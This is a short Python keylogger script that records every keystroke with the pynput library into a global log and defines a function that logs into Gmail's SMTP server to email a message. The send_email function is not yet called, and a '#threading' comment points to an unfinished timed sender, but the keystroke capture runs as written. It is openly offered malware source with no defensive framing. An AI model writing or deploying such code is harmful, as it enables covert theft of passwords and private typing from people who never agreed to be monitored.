import pynput.keyboard
import smtplib
import threading

log = ""

def callback_function(key):

    global log

    try:
        log = log + str(key.char)

    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + str(key)

   


def send_email(email, password, message):
    email_server = smtplib.SMTP("smtp.gmail.com",587)
    email_server.starttls()
    email_server.login(email,password)
    email_server.sendmail(email,email,message)
    email_server.quit()






keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)
#threading
with keylogger_listener:

    keylogger_listener.join()
    

